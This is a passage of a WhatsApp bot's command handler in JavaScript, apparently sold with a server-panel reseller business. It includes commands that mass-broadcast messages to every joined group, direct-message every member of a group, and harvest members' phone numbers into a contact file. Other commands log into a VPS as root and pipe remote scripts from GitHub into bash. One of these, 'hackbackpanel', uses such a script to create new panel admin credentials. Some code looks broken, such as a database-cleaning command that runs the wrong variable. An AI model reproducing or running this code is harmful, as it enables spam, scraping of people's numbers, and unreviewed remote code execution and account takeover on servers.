if (!text) return reply(`Format salah!\n*contoh:* ${cmd} teks & kirim foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await sock.download(qmsg)
    }
    const allGroups = await sock.groupFetchAllParticipating()
    const jids = m.chat
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text, mentions: [] }
        : { text: text, mentions: [] }
    const senderChat = m.chat
    await reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} hidetag ke ${groupIds.length} grup chat`)
    
    for (const groupId of groupIds) {
        try {
            if (BlJpm.includes(groupId)) continue
            messageContent.mentions = allGroups[groupId].participants.map(e => e.id)
            await sock.sendMessage(groupId, messageContent, { quoted: FakeMarket })
            successCount++
        } catch (err) {            
        }
        await sleep(3500)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    await reply(`JPM Hidetag Telah Selsai ✅\nPesan berhasil dikirim ke ${successCount} grup chat.`, jids)
}
break

//=============================================//

case "setjpm": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`Masukan teks & foto (opsional)\n*contoh:* ${cmd} teksjpm & reply foto`)
let image = null
let teks = text
if (/image/.test(mime)) {
const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    image = dd
}
let Jpm = JSON.parse(fs.readFileSync("./Data/jpm.json"))
Jpm = image ? { text: teks, image: image } : { text: teks }
await fs.writeFileSync("./Data/jpm.json", JSON.stringify(Jpm, null, 2))
return reply(`Berhasil setting auto Jpm ✅
- Type Jpm: ${image ? "Teks & Foto" : "Teks"}`)
}
break

//=============================================//

case "startjpm": {
if (!isOwner) return reply(mess.owner);
const Jpm = JSON.parse(fs.readFileSync("./Data/jpm.json"))
if (!Jpm.text) return reply(`Jpm belum di setting\nketik .setjpm untuk setting Jpm`)
    let mediaPath = Jpm.image ? Jpm.image : null
    const allGroups = await sock.groupFetchAllParticipating()
    const jids = m.chat
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: {url: mediaPath}, caption: Jpm.text }
        : { text: Jpm.text }
    const senderChat = m.chat
    await reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} ke ${groupIds.length} grup chat`)
    
    for (const groupId of groupIds) {
        if (BlJpm.includes(groupId)) continue
        try {
            await sock.sendMessage(groupId, messageContent, { quoted: FakeMarket })
            successCount++
        } catch {            
        }
        await sleep(3500)
    }
    await reply(`JPM Telah Selsai ✅\nPesan berhasil dikirim ke ${successCount} grup chat.`, jids)
}
break

//=============================================//

case "delsetjpm": {
if (!isOwner) return reply(mess.owner)
await fs.writeFileSync("./Data/jpm.json", "{}")
return m.reply("Berhasil menghapus setjpm ✅")
}

//=============================================//

case "jpm": {
if (!isOwner) return reply(mess.owner);
if (!text) return reply(`Format salah!\n*contoh:* ${cmd} teks & kirim foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await sock.download(qmsg)
    }
    const allGroups = await sock.groupFetchAllParticipating()
    const jids = m.chat
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }
    const senderChat = m.chat
    await reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} ke ${groupIds.length} grup chat`)
    
    for (const groupId of groupIds) {
        if (BlJpm.includes(groupId)) continue
        try {
            await sock.sendMessage(groupId, messageContent, { quoted: FakeMarket })
            successCount++
        } catch (err) {            
        }
        await sleep(3500)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    await reply(`JPM Telah Selsai ✅\nPesan berhasil dikirim ke ${successCount} grup chat.`, jids)
}
break


//=============================================//

case "closegc":
case "close":
case "opengc":
case "open": {
    if (!m.isGroup) {
        return reply(mess.group);
    }

    if (!isOwner && !m.isAdmin) {
        return reply(mess.admin);
    }

    if (!m.isBotAdmin) {
        return reply(mess.botadmin);
    }

    try {
        if (/open|opengc/.test(command)) {
            if (m.metadata && m.metadata.announce === false) {
                return
            }
            await sock.groupSettingUpdate(m.chat, 'not_announcement');
            reply("Grup berhasil dibuka! Sekarang semua anggota dapat mengirim pesan.");
        } else if (/closegc|close/.test(command)) {
            if (m.metadata && m.metadata.announce === true) {
                return m
            }
            await sock.groupSettingUpdate(m.chat, 'announcement');
            reply("Grup berhasil ditutup! Sekarang hanya admin yang dapat mengirim pesan.");
        }
    } catch (error) {
        console.error("Error updating group settings:", error);
        return reply("Terjadi kesalahan saat mencoba mengubah pengaturan grup.");
    }
}
break;


//=============================================//

case "kick":
case "kik": {
    if (!m.isGroup) {
        return reply(mess.group);
    }

    if (!isOwner && !m.isAdmin) {
        return reply(mess.admin);
    }

    if (!m.isBotAdmin) {
        return reply(mess.botadmin);
    }

    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (m.quoted && m.quoted.sender) {
        target = m.quoted.sender;
    } else if (text) {
        const cleanedText = text.replace(/[^0-9]/g, "");
        if (cleanedText) {
            target = cleanedText + "@s.whatsapp.net";
        }
    }

    if (!target) {
        return reply("*contoh:* .kik @tag_target");
    }

    try {
        const onWa = await sock.onWhatsApp(target.split("@")[0]);
        if (onWa.length < 1 || !onWa[0].exists) {
            return reply("Nomor target tidak terdaftar di WhatsApp.");
        }
    } catch (error) {
        console.error("Error checking on WhatsApp:", error);
        return reply("Terjadi kesalahan saat memeriksa nomor target.");
    }
    
    try {
        const res = await sock.groupParticipantsUpdate(m.chat, [target], 'remove');
        await reply(`Berhasil mengeluarkan @${target.split("@")[0]}`, m.chat, [target])
    } catch (error) {
        console.error("Error kicking participant:", error);
        return reply("Gagal mengeluarkan anggota. Mungkin ada batasan atau kesalahan lain.");
    }
}
break;


//=============================================//

case "demote":
case "promote": {
    if (!m.isGroup) {
        return reply(mess.group);
    }

    if (!isOwner && !m.isAdmin) {
        return reply(mess.admin);
    }

    if (!m.isBotAdmin) {
        return reply(mess.botadmin);
    }

    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (m.quoted && m.quoted.sender) {
        target = m.quoted.sender;
    } else if (text) {
        const cleanedText = text.replace(/[^0-9]/g, "");
        if (cleanedText) {
            target = cleanedText + "@s.whatsapp.net";
        }
    }

    if (!target) {
        return reply(`*contoh:* ${cmd} @tag_target`);
    }

    try {
        const onWa = await sock.onWhatsApp(target.split("@")[0]);
        if (onWa.length < 1 || !onWa[0].exists) {
            return reply("Nomor target tidak terdaftar di WhatsApp.");
        }
    } catch (error) {
        console.error("Error checking on WhatsApp:", error);
        return reply("Terjadi kesalahan saat memeriksa nomor target.");
    }

    let action;
    if (/demote/.test(command)) {
        action = "demote";
    } else if (/promote/.test(command)) {
        action = "promote";
    } else {
        return reply("Perintah tidak valid. Gunakan 'promote' atau 'demote'.");
    }

    try {
        await sock.groupParticipantsUpdate(m.chat, [target], action);       
        await reply(`Berhasil ${action} @${target.split("@")[0]}`, m.chat, [target])
    } catch (error) {
        console.error(`Error ${action}ing participant:`, error);
        return reply(`Gagal ${action} anggota. Pastikan target adalah anggota grup dan bot memiliki izin.`);
    }
}
break;


//=============================================//

case "ht":
case "hidetag": {
    if (!m.isGroup) {
        return reply(mess.group);
    }

    if (!isOwner) {
        return reply(mess.owner);
    }

    if (!text) {
        return reply(`*contoh:* ${cmd} teksnya`);
    }

    try {
        if (!m.metadata || !m.metadata.participants) {
            return reply("Gagal mendapatkan daftar anggota grup. Coba lagi.");
        }

        const members = m.metadata.participants.map(v => v.id);
        
        await sock.sendMessage(m.chat, {
            text: text,
            mentions: members
        }, {
            quoted: null
        });
    } catch (error) {
        console.error("Error sending hidetag message:", error);
        return reply("Terjadi kesalahan saat mencoba mengirim pesan hidetag.");
    }
}
break;

//=============================================//

case "acc": case "reject": {
    if (!m.isGroup) {
        return reply(mess.group);
    }

    if (!isOwner && !m.isAdmin) {
        return reply(mess.admin);
    }

    if (!m.isBotAdmin) {
        return reply(mess.botadmin);
    }
    
    const num = await sock.groupRequestParticipantsList(m.chat)
    if (num.length < 1) return reply("Tidak ada list request join!")
    let action = "approve"
    if (command == "reject") action = "reject"  
    let target = [num[0].jid]
    if (text && text == "all") target = num.map(e => e.jid)

    await sock.groupRequestParticipantsUpdate(m.chat, target, action)    
    return reply(`Sukses ${action} @${target.map(e => e.split("@")[0]).join(" @")}`, m.chat, target)
}
break


//=============================================//

case "sendtesti":
case "testi":
case "uptesti": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply(`Format salah!\n*contoh:* ${cmd} teks & kirim foto (opsional)`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await sock.download(qmsg)
    }
    const allGroups = await sock.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageText = text
    const senderChat = m.chat
    await reply(`Memproses JPM testimoni ke dalam saluran & ${groupIds.length} grup chat`)
    try {
        const messageContent = mediaPath
            ? { image: await fs.readFileSync(mediaPath), caption: messageText }
            : { text: messageText }

        await sock.sendMessage(global.idChannel, messageContent)
    } catch (err) {
        console.error("Gagal mengirim ke saluran:", err)
    }
    const groupMessage = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: messageText }
        : { text: messageText }
    for (const groupId of groupIds) {
    if (BlJpm.includes(groupId)) continue
        try {
            await sock.sendMessage(groupId, {
                ...groupMessage,
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender],
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idChannel,
                        newsletterName: global.namaChannel
                    }
                }
            }, { quoted: FakeMarket })

            successCount++
        } catch (err) {            
        }
        await sleep(3500)
    }
    if (mediaPath) {
        await fs.unlinkSync(mediaPath)
    }
    await reply(`JPM Testimoni Telah Selsai ✅\nPesan berhasil dikirim ke ${successCount} grup chat.`, senderChat)
}
break

//=============================================//

case "setjeda": case "setjedapus": case "setjedapush": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`Format salah!
*contoh:* ${cmd} 5000

Jeda pushkontak saat ini:
${set.JedaPushkontak}

Keterangan:
1000 = 1 detik`)
if (isNaN(text)) return reply(`Format salah!
*contoh:* ${cmd} 5000

Jeda pushkontak saat ini:
${set.JedaPushkontak}

Keterangan:
1000 = 1 detik`)
set.JedaPushkontak = Number(text)
await fs.writeFileSync("./Data/jedapushkontak.json", JSON.stringify(set, null, 2))
return reply(`Berhasil Mengubah Jeda Pushkontak ✅\n\nJeda Pushkontak Saat Ini:\n${set.JedaPushkontak}`)
}
break

//=============================================//

case "listgc": case "listgrup": {
if (!isOwner) return reply(mess.owner)
let teks = ``
let a = await sock.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return reply(teks)
}
break

//=============================================//

case "pushkontak": case "puskontak": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(`Masukan pesannya\n*contoh:* ${cmd} pesannya`)
global.textpushkontak = text
let rows = []
const a = await sock.groupFetchAllParticipating()
if (a.length < 1) return reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response ${u.id}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Pushkontak\n`
}, { quoted: m })
}
break

//=============================================//

case "pushkontak-response": {
  if (!isOwner) return reply(mess.owner)
  if (!global.textpushkontak) return reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await sock.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id && v.id.endsWith('.net'))
    .map(v => v.id)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);

  for (const mem of halls) {
    await sock.sendMessage(mem, { text: teks }, { quoted: FakeLiveLoc });
    await global.sleep(set.JedaPushkontak);
  }
  delete global.textpushkontak
  await reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${halls.length}* member.`, jidawal)
}
break

case "savekontak": case "svkontak": {
if (!isOwner) return reply(mess.owner)
let rows = []
const a = await sock.groupFetchAllParticipating()
if (a.length < 1) return reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.savekontak-response ${u.id}`
})
}
await sock.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© ${global.namaBot} Version ${global.versiBot}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Savekontak\n`
}, { quoted: m })
}
break

//=============================================//

case "savekontak-response": {
  if (!isOwner) return reply(mess.owner)
  if (!text) return 
  try {
    const res = await sock.groupMetadata(text)
    const halls = res.participants
      .filter(v => v.id.endsWith('.net'))
      .map(v => v.id)
      .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

    if (!halls.length) return reply("Tidak ada kontak yang bisa disimpan.")
    let names = text
    const existingContacts = JSON.parse(fs.readFileSync('./Data/contacts.json', 'utf8') || '[]')
    const newContacts = [...new Set([...existingContacts, ...halls])]

    fs.writeFileSync('./Data/contacts.json', JSON.stringify(newContacts, null, 2))

    // Buat file .vcf
    const vcardContent = newContacts.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:Buyyer - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./Data/contacts.vcf", vcardContent, "utf8")

    // Kirim ke private chat
    if (m.chat !== m.sender) {
      await reply(`Berhasil membuat file kontak dari grup ${res.subject}\n\nFile kontak telah dikirim ke private chat\nTotal ${halls.length} kontak`)
    }

    await sock.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./Data/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `File kontak berhasil dibuat ✅\nTotal ${halls.length} kontak`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    )

    fs.writeFileSync("./Data/contacts.json", "[]")
    fs.writeFileSync("./Data/contacts.vcf", "")

  } catch (err) {
    reply("Terjadi kesalahan saat menyimpan kontak:\n" + err.toString())
  }
}
break

//=============================================//

case "done":
case "don":
case "proses":
case "ps": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply(`*contoh:* ${cmd} nama barang`);
    const status = /done|don/.test(command) ? "Transaksi Done ✅" : "Dana Masuk ✅";
    const teks = `
*${status}*

📦 ${text}
⏰ ${global.tanggal(Date.now())}

🔖 Channel Testimoni :
${global.linkChannel.split("https://")[1] || "-"}
🔖 Grup Bebas Share/Promosi :
${global.linkGrup.split("https://")[1] || "-"}
`;
    await sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
        }
    }, { quoted: FakeMarket });
}
break;


case "cleardbpanel": {
    if (!isOwner) return reply(mess.owner);

    const t = text.split('|');
    if (t.length < 2) return reply(`*Contoh penggunaan:*\n${cmd} ipvps|pwvps`);

    const ipvps = t[0].trim();
    const passwd = t[1].trim();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    

    const conn = new ssh2.Client();
    let outputLog = "";

    reply(`🧹 *Sedang membersihkan MySQL di VPS...*\n🌐 IP: ${ipvps}`);

    conn.on('ready', () => {
        conn.exec(command, (err, stream) => {
            if (err) {
                console.error("Exec error:", err);
                reply("❌ Gagal menjalankan perintah di VPS.");
                conn.end();
                return;
            }

            stream.on('data', async (data) => {
                const chunk = data.toString();
                outputLog += chunk;

                // Kirim potongan output ke pengguna
                console.log(chunk.trim().slice(0, 3000))
            });

            stream.stderr.on('data', async (data) => {
                const chunk = data.toString();
                outputLog += chunk;
                
                console.log(chunk.trim().slice(0, 3000))               
            });

            stream.on('close', async (code, signal) => {
                let doneMsg = `
✅ *Proses Selesai*
📦 Status: ${code === 0 ? "Sukses" : "Gagal sebagian"}
🌐 IP VPS: ${ipvps}
                `.trim();

                await sock.sendMessage(m.chat, { text: doneMsg }, { quoted: m });
                conn.end();
            });
        });
    }).on('error', (err) => {
        console.error('Connection Error:', err);
        reply('❌ Gagal terkoneksi ke VPS. Pastikan IP dan password benar.');
    }).connect(connSettings);
}
break;

//=============================================//

case "hbpanel":
case "hackbackpanel": {
    if (!isOwner) return reply(mess.owner);

    const t = text.split('|');
    if (t.length < 2) return reply(`*Contoh penggunaan:*\n${cmd} ipvps|pwvps`);

    const ipvps = t[0].trim();
    const passwd = t[1].trim();
    const newuser = "admin" + getRandom("");
    const newpw = "admin" + getRandom("");

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
    const ress = new ssh2.Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) {
                console.error("Exec error:", err);
                reply("Terjadi kesalahan saat menjalankan perintah.");
                ress.end();
                return;
            }

            // Menulis input ke installer
            let hasWritten = false;
            stream.stderr.on('data', (data) => {
                const stderrOutput = data.toString().toLowerCase();
                    stream.write("skyzodev\n");
                    stream.write("7\n");
                    stream.write(`${newuser}\n`);
                    stream.write(`${newpw}\n`);
            });

            stream.on('close', async (code, signal) => {
                let teks = `
*Hackback panel pterodactyl berhasil ✅*

- Username: *${newuser}*
- Password: *${newpw}*
- IP VPS: ${ipvps}
`;
                await sock.sendMessage(m.chat, { text: teks }, { quoted: m });
                ress.end();
            });

            stream.on('data', (data) => {
                console.log(data.toString());
            });
        });
    }).on('error', (err) => {
        console.error('Connection Error:', err);
        reply('❌ Gagal terkoneksi ke VPS. Pastikan IP dan password benar.');
    }).connect(connSettings);
}
break;

//=============================================//

case "uninstallpanel": { 
if (!isOwner) return reply(mess.owner);
if (!text || !text.split("|")) return reply(`*Contoh penggunaan:*\n${cmd} ipvps|pwvps`); 
var vpsnya = text.split("|"); 
if (vpsnya.length < 2) return reply(`*Contoh penggunaan:*\n${cmd} ipvps|pwvps`); 
let ipvps = vpsnya[0]; 
let passwd = vpsnya[1]; 
const connSettings = { host: ipvps, port: '22', username: 'root', password: passwd }; 
const boostmysql = `
apt-get remove --purge -y mysql-server mysql-client mysql-common && \
apt-get autoremove -y && apt-get autoclean -y && \
rm -rf /etc/mysql /var/lib/mysql && \
echo "✅ MySQL berhasil dibersihkan."
`;
const command = `bash <(curl -s https://pterodactyl-installer.se)`; 
const ress = new ssh2.Client();

ress.on('ready', async () => {
    await reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selesai");

    ress.exec(command, async (err, stream) => {
        if (err) throw err;
        stream.on('close', async (code, signal) => {
            await ress.exec(boostmysql, async (err, stream) => {
                if (err) throw err;
                stream.on('close', async (code, signal) => {
                    await reply("Berhasil *uninstall* server panel ✅");
                }).on('data', async (data) => {
                    await console.log(data.toString());
                    if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
                        await stream.write("yes\n");
                    }
                }).stderr.on('data', (data) => {
                    reply('Berhasil Membersihkan Database MYSQL Server Panel ✅');
                });
            });
        }).on('data', async (data) => {
            await console.log(data.toString());
            if (data.toString().includes(`Input 0-6`)) {
                await stream.write("6\n");
            }
            if (data.toString().includes(`(y/N)`)) {
                await stream.write("y\n");
            }
            if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
                await stream.write("\n");
            }
            if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
                await stream.write("\n");
            }
        }).stderr.on('data', (data) => {
            m.reply('STDERR: ' + data);
        });
    });
}).on('error', (err) => {
    m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);

}
break

//=============================================//

case "installpanel": {
    if (!isOwner) return reply(mess.owner)
    if (!text) return reply("\nFormat salah!\n\n*contoh:*\n.instalpanel ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*");
    
    let vii = text.split("|");
    if (vii.length < 5) return reply("\nFormat Salah!\n\n*contoh:*\n.instalpanel ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*");
    
    const ress = new ssh2.Client();
    const connSettings = {
        host: vii[0],
        port: '22',
        username: 'root',
        password: vii[1]
    };
    
    const jids = m.chat
    const pass = "admin001";
    let passwordPanel = pass;
    const domainpanel = vii[2];
    const domainnode = vii[3];
    const ramserver = vii[4];
    const deletemysql = `\n`;
    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;
    
    async function instalWings() {
    ress.exec(commandPanel, async (err, stream) => {
        if (err) {
            console.error('Wings installation error:', err);
            reply(`Gagal memulai instalasi Wings: ${err.message}`);
            return ress.end();
        }
        
        stream.on('close', async (code, signal) => {
            await InstallNodes()            
        }).on('data', async (data) => {
            const dataStr = data.toString();
            console.log('Wings Install: ' + dataStr);
            
            if (dataStr.includes('Input 0-6')) {
                stream.write('1\n');
            }
            else if (dataStr.includes('(y/N)')) {
                stream.write('y\n');
            }
            else if (dataStr.includes('Enter the panel address (blank for any address)')) {
                stream.write(`${domainpanel}\n`);
            }
            else if (dataStr.includes('Database host username (pterodactyluser)')) {
                stream.write('admin\n');
            }
            else if (dataStr.includes('Database host password')) {
                stream.write('admin\n');
            }
            else if (dataStr.includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
                stream.write(`${domainnode}\n`);
            }
            else if (dataStr.includes('Enter email address for Let\'s Encrypt')) {
                stream.write('admin@gmail.com\n');
            }
        }).stderr.on('data', async (data) => {
            console.error('Wings Install Error: ' + data);
            reply(`Error pada instalasi Wings:\n${data}`);
        });
    });
}

    async function InstallNodes() {
        ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                let teks = `
*Install Panel Telah Berhasil ✅*

*Berikut Detail Akun Panel Kamu 📦*

*👤 Username :* admin
*🔐 Password :* ${passwordPanel}
*🌐 ${domainpanel}*

Silahkan setting alocation & ambil token node di node yang sudah di buat oleh bot

*Cara menjalankan wings :*
*.startwings* ipvps|pwvps|tokennode
`;                
                await reply(teks, jids)
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
                if (data.toString().includes("Masukkan nama lokasi: ")) {
                    stream.write('Singapore\n');
                }
                if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                    stream.write('Node By Skyzo\n');
                }
                if (data.toString().includes("Masukkan domain: ")) {
                    stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes("Masukkan nama node: ")) {
                    stream.write('Skyzopedia\n');
                }
                if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                    stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan Locid: ")) {
                    stream.write('1\n');
                }
            }).stderr.on('data', async (data) => {
                console.log('Stderr : ' + data);
                reply(`Error pada instalasi Wings: ${data}`);
            });
        });
    }

    async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                await instalWings();
            }).on('data', async (data) => {
                if (data.toString().includes('Input 0-6')) {
                    stream.write('0\n');
                } 
                if (data.toString().includes('(y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Database name (panel)')) {
                    stream.write('\n');
                }
                if (data.toString().includes('Database username (pterodactyl)')) {
                    stream.write('admin\n');
                }
                if (data.toString().includes('Password (press enter to use randomly generated password)')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
                    stream.write('Asia/Jakarta\n');
                } 
                if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
                    stream.write('admin@gmail.com\n');
                } 
                if (data.toString().includes('Email address for the initial admin account')) {
                    stream.write('admin@gmail.com\n');
                } 
                if (data.toString().includes('Username for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('First name for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Last name for the initial admin account')) {
                    stream.write('admin\n');
                } 
                if (data.toString().includes('Password for the initial admin account')) {
                    stream.write(`${passwordPanel}\n`);
                } 
                if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
                    stream.write(`${domainpanel}\n`);
                } 
                if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
                    stream.write('y\n')
                } 
                if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
                    stream.write('1\n');
                } 
                if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('(yes/no)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Still assume SSL? (y/N)')) {
                    stream.write('y\n');
                } 
                if (data.toString().includes('Please read the Terms of Service')) {
                    stream.write('y\n');
                }
                if (data.toString().includes('(A)gree/(C)ancel:')) {
                    stream.write('A\n');
                } 
                console.log('Logger: ' + data.toString());
            }).stderr.on('data', (data) => {
                reply(`Error Terjadi kesalahan :\n${data}`);
                console.log('STDERR: ' + data);
            });
        });
    }

    ress.on('ready', async () => {
        await reply(`*Memproses install server panel 🚀*\n\n` +
                     `*IP Address:* ${vii[0]}\n` +
                     `*Domain Panel:* ${domainpanel}\n\n` +
                     `Mohon tunggu 10-20 menit hingga proses install selesai`);
        
        ress.exec(deletemysql, async (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async (code, signal) => {
                await instalPanel();
            }).on('data', async (data) => {
                await stream.write('\t');
                await stream.write('\n');
                await console.log(data.toString());
            }).stderr.on('data', async (data) => {
                reply(`Error Terjadi kesalahan :\n${data}`);
                console.log('Stderr : ' + data);
            });
        });
    });

    ress.on('error', (err) => {
        console.error('SSH Connection Error:', err);
        reply(`Gagal terhubung ke server: ${err.message}`);
    });

    ress.connect(connSettings);
}
break

case "startwings":
case "configurewings": {
    if (!isOwner) return reply(mess.owner)
    let t = text.split('|');
    if (t.length < 3) return reply(`Input ipvps,password & token wings\n*contoh:* ${cmd} ipvps|pwvps|token`)

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;

    const ress = new ssh2.Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) {
                reply('Gagal menjalankan perintah di VPS');
                ress.end();
                return;
            }

            stream.on('close', async (code, signal) => {
                await reply("Berhasil menjalankan wings node panel pterodactyl ✅");
                ress.end();
            }).on('data', (data) => {
                console.log("STDOUT:", data.toString());
            }).stderr.on('data', (data) => {
                console.log("STDERR:", data.toString());
                // Opsi jika perlu input interaktif
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                reply('Terjadi error saat eksekusi:\n' + data.toString());
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error:', err.message);
        reply('Gagal terhubung ke VPS: IP atau password salah.');
    }).connect(connSettings);
}
break;

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
    if (!isOwner && !isGrupReseller) {
        return reply(`Fitur ini untuk di dalam grup reseller panel`);
    }
    if (!text) return reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)
